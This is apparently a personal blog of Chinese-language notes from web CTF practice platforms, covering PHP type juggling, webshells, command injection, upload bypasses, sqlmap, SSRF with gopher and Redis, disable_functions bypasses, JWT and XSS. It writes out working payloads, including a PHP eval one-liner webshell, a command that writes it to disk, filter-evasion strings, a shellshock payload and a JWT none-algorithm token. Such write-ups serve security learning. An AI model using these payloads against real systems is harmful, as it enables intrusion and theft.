---
title: webCTF记录
date: 2022-05-02 18:28:53
categories:
- CS
- security
tags:
- web
- CTF
toc: true
---
**摘要：本文记录刷过的web题**
<!-- more -->
---
# 一、xctf
## simple pHp
![20220516110337](https://s2.loli.net/2022/05/16/Wog1vasrdIbTc4C.png)
pHp tricks:
```
1.php中字符与与数字比较大小时，会省略字符
2.is_numeric 只要有字符出现就是false
3.pHp弱类型比较：==是松散比较，只比较值不比较类型，===是严格比较，比较值和类型
```
```
php中其中两种比较符号:
字符串和数字比较使用==时,字符串会先转换为数字类型再比较
var_dump('a' == 0);//true，此时a字符串类型转化成数字，因为a字符串`开头中没有找到数字`，所以转换为0
var_dump('123a' == 123);//true，这里'123a'会被转换为123
var_dump('a123' == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时`整体值为0`。
$a即a为真，a不能是数字0
```
所以最终url为`http://111.198.29.45:44663/?a=a&b=1235a`

## get_post
![20220516112244](https://s2.loli.net/2022/05/16/wifBjbXr4GlOU13.png)
burp一键变更请求类型(注意a仍为get)
其中content-length只有post才会有，所以要把其改成3

## xff_referer
X-Forwarder-For：改变发送请求的IP
Referer：源地址，如题目要求必须来自https://www.google.com

## webshell
![20220516113037](https://s2.loli.net/2022/05/16/HDndGoLkfaWgZBT.png)
首先存在一个名为shell的变量，shell的取值为HTTP的POST方式。Web服务器对shell取值以后，然后通过eval()函数执行shell里面的内容。
可以将以上代码写入webshell.php文件中然后放在站点目录下通过浏览器访问，以POST方式传入shell=phpinfo();
![20220516113627](https://s2.loli.net/2022/05/16/OXbxHpAwyZ2kr6D.png)
也可以用蚁剑或菜刀等工具连接(我这里用的是蚁剑)：在url地址框中输入http://127.0.0.1/webshell.php，在连接密码框中输入shell
![20220516113645](https://s2.loli.net/2022/05/16/haZTLzdnqNPltfs.png)
```
eval() 函数把字符串按照 PHP 代码来执行
assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。
```
[pHp一句话马](https://www.jianshu.com/p/6b815f951db3)

不用菜刀做法：
用burp输入shell = system(“find / -name ‘flag*’”);
system("Linux命令"),相当于开了个linux终端(/为根目录，/home,/user)
查看 Response，最下方有目标文件路径
shell = system(“cat /var/www/html/flag.txt”);
cat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的

也可以一次性执行多行代码：
```
shell=echo'<pre>';(echo单双引号均可)效果是出现个方框
```
![20220516123133](https://s2.loli.net/2022/05/16/BHWQXlfEF8ikZoA.png)
grep 查找文件里符合条件的字符串

## ping
os命令执行漏洞
![20220516124125](https://s2.loli.net/2022/05/16/Smflj7Ha3rV9egY.png)
发现实际上是输入了一个命令的参数
```
windows或linux下命令执行
command1 & command2 ：不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入），也就是command1和command2都执行
command1 && command2 ：先执行command1执行成功后才会执行command2，若command1执行失败，则不执行command2
command1 | command2 ：只执行command2
command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)
```

## simple js
"\x49\x51\x5a\x56\x54"是C/C++ 里普通的转义字符。直接用cout 或者 printf 就能显示出来。
发现是55,56,54,79,115,69,114,116,107,49,50
var n = String.fromCharCode(65);//n = A ,将 Unicode 编码转为一个字符
```
js中的连等号顺序：
多次赋值与顺序无关，是同时进行赋值的
每个节点的变量最终赋值的值取决去最后一个等号的右边值
如果赋值是引用类型，则最终指向的是同一个对象

JavaScript数组越界访问不会报错，只会返回undefined。
```
代码审计发现结果只与pass有关，即输出FAUX PASSWORD HAHA，与输入无关
另一个有意义的字符就是string里的了，想到把pass换成string执行一下,p += chr(int(t2[17]))要换成string的最后一个
exp如下：
![20220516233104](https://s2.loli.net/2022/05/16/uUWRPI6pnoi2re7.png)
## pHp2
![20220516174816](https://s2.loli.net/2022/05/16/cUuTyizS9jZWbrY.png)

注意：这里需要将admin进行二次编码才可成功，因为浏览器会自动进行一次url解码，解码之后传递给代码相当于没进行编码，还是admin

最后，又去看了一下御剑，发现我的字典里没有.phps结尾的，能扫出来就怪了。--御剑的能力取决于字典

```
.phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。
它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source
```
## ics-06
爆破id
intruder payload 选number

## Web_php_unserialize
```
pHp的class
1、__construct()：当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。（构造函数）
2、__destruct()：当对象被销毁时会自动调用。（析构函数）
3、__wakeup()：unserialize() 时会自动调用
4.正则表达式匹配preg_match() 函数
```
![20220517101903](https://s2.loli.net/2022/05/17/OesxJcE4dpGUDSg.png)
告诉我们，这个flag在fl4g.php这个页面中，如果Demo类被销毁，那么就会高亮显示file所指向的文件的内容。
/[oc]:\d+:/i研究
[OC]：正则表达式以o或c开头
```
正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，
这个“规则字符串”用来表达对字符串的一种过滤逻辑。
\d:  匹配一个数字字符。等价于 [0-9]。
 +:  匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。
/i:  表示匹配的时候不区分大小写
```
__wakeup的绕过:
当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,所以只要把`O:4:“Demo”:1:{s:10:“Demofile”;s:8:“fl4g.php”;}`中的1那改成任意比他大的数即可

# 二、ctfhub
## 1.HTTP 请求方法
GET, POST 和 HEAD方法。
OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法
```
OPTIONS
返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性
PUT
向指定资源位置上传其最新内容
DELETE
请求服务器删除Request-URL所标识的资源
TRACE
回显服务器收到的请求，主要用于测试或诊断
CONNECT
HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。
```

## 2.HTTP临时重定向
返回302响应码，临时跳转到location
注意burp要开启拦截服务器响应

## 3.基础认证
基本认证（Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式
在进行基本认证的过程里，请求的HTTP头字段会包含Authorization字段，形式如下： Authorization: Basic <凭证>，该凭证是用户和密码的组和的base64编码。如
```
GET /private/index.html HTTP/1.0
Host: localhost
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
```
缺点：基本认证并没有为传送凭证（transmitted credentials）提供任何机密性的保护。仅仅使用 Base64 编码并传输，而没有使用任何 加密 或 散列算法。因此，基本认证常常和 HTTPS 一起使用，以提供机密性。
密码爆破，要去掉有效载荷编码

## 4.xss
url编解码：我们都知道Http协议中参数的传输是"key=value"这种简直对形式的，如果要传多个参数就需要用“&”符号对键值对进行分割。如"?name1=value1&name2=value2"，这样在服务端在收到这种字符串的时候，会用“&”分割出每一个参数，然后再用“=”来分割出参数值。
取出value时会进行url解码(hello不管解多少次都是hello)
send相当于机器人自动点击我们提交的网址
![20220521172751](https://s2.loli.net/2022/05/21/954LW8jHf1bKxdE.png)

## 5.信息泄露
### git
```bash
目录扫描发现/.git
---
pip3 install GitHacker
githacker --url http://127.0.0.1/.git/ --output-folder result
--brute #暴力破解所有可能的branch名
---
kali里运行
python2 GitHack.py http://www.example.com/.git/
---
git log
git stash list
git index
git branch
.git/config文件可能含有access_token可以访问该用户其他仓库
```

### svn(subversion)、hg、cvs、bzr
[神器dvcs-ripper](https://github.com/kost/dvcs-ripper)
```
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper 命令
命令有：
rip-git.pl -v -u http://www.example.com/.git/   或者   rip-git.pl -s -v -u http://www.example.com/.git/
rip-hg.pl -v -u http://www.example.com/.hg/     或者   rip-hg.pl -s -v -u http://www.example.com/.hg/
rip-bzr.pl -v -u http://www.example.com/.bzr/
rip-svn.pl -v -u http://www.example.com/.svn/
rip-cvs.pl -v -u http://www.example.com/CVS/
```
svn和git的区别：
```
1.git是分布式的，有本地和远程两个版本库，SVN是集中式，只有一个远程版本库；
2.git的内容是按元数据方式存贮，所有控制文件在.git中，svn是按文件处理，所有资源控制文件在.svn中；
3.svn的分支是一个目录，git不是；
4.git没有一个全局的版本号，svn有；
5.git内容存贮是使用SHA-1哈希算法，能确保代码完整性;
6.git 有工作区，暂存区，远程仓库，git add将代码提交到暂存区， commit提交到本地版本库，push推送到远程版本库。svn是add 提交到暂存，commit是提交到远程版本库。
```
试图从 wc.db 中找到 flag, 尝试访问结果文件名发现被删除了。
```bash
cat wc.db | grep -a flag
```
转而寻找 .svn/pristine/ 中的文件，找到 flag
.svn目录(制作字典)：
```
├── pristine 各个版本纪录，这个文件一般较大
├── tmp 
├── entries 当前版本号
├── format 文本文件， 放了一个整数，当前版本号
├── wc.db 二进制文件
├── wc.db-journal 二进制文件
```
[参考](https://juejin.cn/post/6960836262894764039)

### .DS_Store
.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。
直接cat .DS_Store
### 备份文件
```py
name = ['web','website','backup','back','www','wwwroot','temp']
ext = ['tar','tar.gz','zip','rar']
index.php.bak
.index.php.swp #恢复方法是先用vim创建一个index.php,再vim -r index.php
```
## 6.口令爆破
### 弱口令
看到后台想到用户名为admin
### 默认口令
百度社工

### 总结
要边做题边总结出自己的字典

## 7.sql注入
用sqlmap的url一定要有参数?id=1,无脑y
### cookie
--level 2：等级2以上才会检测cookie注入
--cookie:id=1 ：可能可注入的参数
![20220526151313](https://s2.loli.net/2022/05/26/4y5NSt6qTWk8DeA.png)
### ua
--level 3:等级3以上才会检测ua注入
burp抓包得到的数据放进a.txt
![20220526155332](https://s2.loli.net/2022/05/26/dAyNkDfOxZ5RUWV.png)
```
sqlmap -r “a.txt” -p “User-Agent”(注意不能有-u了)
```
### referer注入
--level 5
burp抓包得到的数据发现没有Refer请求头，添加Refer请求头放进b.txt
![20220526155226](https://s2.loli.net/2022/05/26/ABjKmUeYPMIEWSu.png)
注入命令
```
sqlmap -r "b.txt" --level 5 -p "referer"
```
### 绕过空格
sqlmap自带space2comment.py 脚本，用法是--tamper "space2comment.py"

 sqlmap 中的 tamper 脚本有很多，例如： equaltolike.py （作用是用like代替等号）、 apostrophemask.py （作用是用utf8代替引号）、 greatest.py （作用是绕过过滤'>' ,用GREATEST替换大于号）等。

## 8.文件上传
菜刀蚁剑这些必须用_POST[]传
为什么要上传PHP木马而不是JSP,ASPX的木马
```bash
通过环境来看，基本判断方式有以下几种：
1.看文件后缀 #如网页显示 xxxx.com/index.php,或者右键源代码中，表单提交action="upload.php"
2.插件检测（Wappalyzer插件）#可以检测当前页面的基础环境，如中间件，前后端语言等
3.响应包判断 #看响应包如burpsuite的响应包如下：X-Powered-By: PHP/7.3.14
```
步骤：
```
1.先看前端绕过
2.大小写、'php '、'php.'、'php::$DATA'(网站服务器是windows才行)

```
### .htaccess
.htaccess文件(在www文件夹)是Apache服务器中的一个配置文件，用于控制它所在的目录以及该目录下的所有子目录。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、`改变文件扩展名`、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能
源代码如下，用黑名单禁止了php上传，但我们可以写个黑名单没有的.htaccess文件上传到upload目录从而控制该目录，至于原目录的.htaccess会被覆盖掉
![20220526182945](https://s2.loli.net/2022/05/26/Rn56gD4rXqK23U8.png)
```php
move_uploaded_file() 函数将上传的文件移动到新位置。
若成功，则返回 true，否则返回 false .(本函数仅用于通过 HTTP POST 上传的文件。)
注意：如果目标文件已经存在，将会被覆盖。
```
在低于2.3.8版本时，因为默认AllowOverride为all，可以尝试上传.htaccess文件修改部分配置
```
方法一：
<FilesMatch "文件名的部分">  
SetHandler application/x-httpd-php
</FilesMatch>
方法二：
AddHandler php5-script .php
# 在文件拓展名和解释器之间建立映射
# 指定拓展名为.php的文件应被php5-script解释
```

### 00截断
%00   , 0x00   , /00   都属于00截断,利用的是服务器的解析漏洞(ascii中0表示字符串结束),所以读取字符串到00就会停止,认为已经结束。
![20220526201804](https://s2.loli.net/2022/05/26/rcopi4X6sRL2AQD.png)
_FILE['name']会自动进行一次截断，所以上传的文件无法用00截断，但抓包发现road是通过_GET得到的，而_GET不会自动截断，所以可以用00截断掉`$des`后面的内容，让`$des`为upload/test.php
jdk7u40版本以下存在00截断，以上的版本会调用File的isInvalid()判断文件名是否合法(是否存在\0)。
![20220526205114](https://s2.loli.net/2022/05/26/2OKQeXVtLwamq4k.png)
PHP低于5.4版本时，如果用iconv()函数把utf8的字符转换成其他类型，而且转换的字符不在utf8的单字节范围(0x00-0x7F)内，转换时就会把其和后面的字符截断。php高于5.4时会返回fasle

### MIME绕过
在HTTP中MIME类型被定义header的Content-Type中。此处便是我们进行绕过检测成功上传的核心
![20220526211253](https://s2.loli.net/2022/05/26/zGmMR3epWCtEVvP.png)

### 文件头检测
随便找张png,上传抓包,只保留文件头几行的内容，后面的全删掉(太多内容蚁剑就连不上了)，然后在最后一行加上php代码，再改下文件后缀名

### .user.ini
局限：只有当前目录有php文件被执行时才会加载当前目录的.user.ini

## 9.Rce(远程命令执行)
![20220526213738](https://s2.loli.net/2022/05/26/37lK5pmUBWJQtYn.png)
windows:%0a、&、|(忽略前一个)、&&、||(忽略后一个)、%1a(一个神奇的角色,作为.bat文件中的命令分隔符)
linux中:; 、& 、| 、&&、|| 、%0a、%0d经测试这里可以使用%0a(注意不能直接在框里输入，而是url或者抓包)
windows转义字符为'^',Linux转义字符为'\'
windows注释为::，Linux注释为#
linux的%0a到了windows要转成%0d%0a(回车)

管道符号，符号为|一条竖线，command 1 | command 2 他的功能是把第一个命令command 1执行的结果作为command 2的输入传给command 2。而且命令 2 只能处理命令 1 的正确输出，而不能处理错误输出。
### 文件包含
可以包含含有php代码的txt文件等，php代码会在传参后的页面执行
php伪协议：php://
![20220526220509](https://s2.loli.net/2022/05/26/1DCsFxBzcRywWNl.png)
![20220526220459](https://s2.loli.net/2022/05/26/OXId4RwEkCLmZQH.png)
此时php://input相当于一个文件
![20220526221614](https://s2.loli.net/2022/05/26/gEkHI8zTbp3siyF.png)
allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件
![20220526223720](https://s2.loli.net/2022/05/26/6mQaqkMAHFl4XEC.png)
php://filter/read=convert.base64-encode/resource=/flag

### 命令注入
直接cat 7672134566268.php
发现无回显
一般遇见这种情况 咱们首先考虑两种方法 第一种，直接查看源代码
果不其然 直接在源代码中找到了
![20220527003437](https://s2.loli.net/2022/05/27/NlV1oTM9pcgRfKj.png)
第二种方法是将文件内容base64编码出来
127.0.0.1&cat 7672134566268.php| base64
第三种方法是写shell(echo >输出重定向把echo的参数输出到某个文件)
```bash
127.0.0.1&echo -e "<?php @eval(\$_POST['test']);?>" > 555.php
#$前必须有转义符，否则双引号里的$会被认为是sh脚本的变量
```
### 绕过cat等关键字
```bash
127.0.0.1&a=c;b=at;$a$b flagxxxx.php
ca''t
c\at
c$*at
或者用其他命令：head、tail等
```
### 过滤空格
如果空格也过滤掉，我们同样可以通过burp来fuzz可以用的字符。
< 、<>、%20(space)、%09(tab)、\$IFS\$9、 \${IFS}、${IFS}等

### 过滤目录分割符/
用cd一层层进入，用;分隔命令

## 10.ssrf
攻击目标：内网
原因：服务端允许从外部获取资源，但没对目标url、协议作过滤和限制
![20220527120727](https://s2.loli.net/2022/05/27/3TIsUMxY8JZPWBC.png)
这里的url相当于我们构造了一个url让服务器去访问
```bash
file:///etc/passwd #伪协议 读源码
dict://172.26.0.2:6379/info #获取服务器运行的服务版本
gopher:// #可向服务器发送任意内容(http,mysql等)
http://127.0.0.1/flag.php #内网访问
```
### 攻击方式
一.内部服务资产探测
二.gopher协议扩展攻击面
1.redis
内网，127.0.0.1:6379,一般空口令。
任意增删查改，利用导出功能写入crontab/webshell/ssh公钥
如果一条指令是错误的，会自动读取下一条，直到是正确的redis指令
反弹shell:控制端监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端
crontab命令：常见于Unix和类Unix的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。
2.mysql
3.php-fpm(fastcgi协议)
4.内网web应用

### 绕过
```
http://www.baidu.com@127.0.0.1
①②③④⑤⑥⑦⑧⑨⑩ ? ? ? ? ? ? ? ? ? ? 。
localhost >>> 127.0.0.1
127.0.0.1.xip.io >>> 127.0.0.1(子域名重定向,国内无效)
```
[DNS重绑定网站](https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg)，我的理解是生成了一个域名，访问这个域名就相当于访问输入的两个ip访问得通的那个
### 工具
抓包改包太麻烦？推荐[Gopherus](https://github.com/tarunkant/Gopherus),不过只能linux
```
gopherus --exploit fastcgi
gopherus --exploit mysql
gopherus --exploit redis
```
### 伪协议读取文件
一般遇到SSRF时，先测试所有的url协议
```
file:///
dict://
sftp://
ldap://
tftp://
gopher://
```
网站的根目录一般在/var/www/html

### POST请求
![20220527121248](https://s2.loli.net/2022/05/27/6zj5PgHk32seUmX.png)
POST请求必备(注意要空行)：
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=2107c7378d01a54efbed766eece23e66
```
gopher://127.0.0.1:80/_内容(比如POST请求)
注意：
1.要经过2次url编码，第一次是网址传进去自动解码，第二次是curl方法还会解码一次
2.POST请求和gopher的端口号
3.Content-Length
4.%0a要换成%0d%0a

### FastCGI协议和redis协议
做这道题又踩了转义的坑，以及gopherus的payload要url编码一次才能输入网址
![20220527161443](https://s2.loli.net/2022/05/27/rCsAmXjkqpvowWH.png)
如果不确定命令正确性，最好是在本地环境试着执行一下输入文件的命令
而且php里的eval参数最好不要有引号(纯数字)

## 11.php绕过disable_function
在已获得webshell但被PHP的disable_function禁用了一些危险函数的命令执行
phpinfo可查看禁用的函数
![20220527193204](https://s2.loli.net/2022/05/27/ZeWQYmApJN1VMbv.png)
发现system被禁用，即无法执行终端命令，必须绕过
蚁剑下载插件绕过disabled functions(梯子)
### LD_PRELOAD
```
1.编写好动态链接库文件并上传到服务器
2.编写PHP文件并上传到服务器，内容为
利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径，然后 配合php的某个函数（例如error_log()或mail()函数）去触发运行动态链接库并执行我们的恶意动态链接库文件的某个函数
3.在浏览器访问执行我们写的PHP文件
```
程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。

### shellshock
如果连不上可以试着换编码
[原理](https://blog.csdn.net/fish43237/article/details/39609031)
我们写入shell.php文件
通过putenv来设置环境变量，默认putenv定义的环境变量名必须以PHP_开头。`putenv("PHP_test=() { :; }; tac /flag >> /var/www/html/test.php");`
error_log("admin",1)函数触发payload

### Apache Mod CGI
>CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.
>MOD_CGI：
任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.
绕过条件：
```
第一，必须是apache环境
第二，mod_cgi已经启用
第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none
第四，必须有权限写.htaccess文件
第五，如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。
比如将所有.ant后缀的文件作为cgi脚本执行
```
### php-fpm
localhost:9000
蚁剑连接http://challenge-03491d0d67fc0dd3.sandbox.ctfhub.com:10800/.antproxy.php

## jwt(类似cookie)
[基础知识](https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob)
[解码](http://jwt.io/)

### 无签名
一些JWT库也支持none算法，即不使用签名算法。当alg字段为none时，后端将不执行签名验证。若能抓包抓到，可改alg和身份，后面的签名直接删掉。
如token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.
如果base64解码的最后面不对，可以添加等于号。因为JWT采取的是base6url编码，如果有等于号会被省略。
### 弱秘钥
对称加密：加密和解密用的秘钥是一样的
工具：c-jwt-cracker（需要在kali上面运行）
```bash
systemctl restart  docker #报错时重启
docker build . -t jwtcrack
docker run -it --rm  jwtcrack + 题目的token
```
### 修改签名算法
有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的

# 三、HackingLab 网络信息安全攻防学习平台
## 1.脚本关
通过`<script>window.location="./no_key_is_here_forever.php"; </script>`重定向了
script的src 属性规定外部脚本文件的 URL。
## 2.XSS基础3:检测与构造
查看哪些标签关键词没有被过滤,建议准备一个txt文件专门用于检测未被过滤函数（burp就可以做）
![20220521184317](https://s2.loli.net/2022/05/21/5B6RYPh3Dba97Qq.png)
最后构造出Welcome <input type='text' value='123' onmouseover="eval(' ale'+'rt(HackingLab)')" s=''>
```
反射型：搜索
存储型：留言板
dom:有道翻译
```
[xss绕过](https://blog.csdn.net/nigo134/article/details/118827542)

# 四、ctfshow


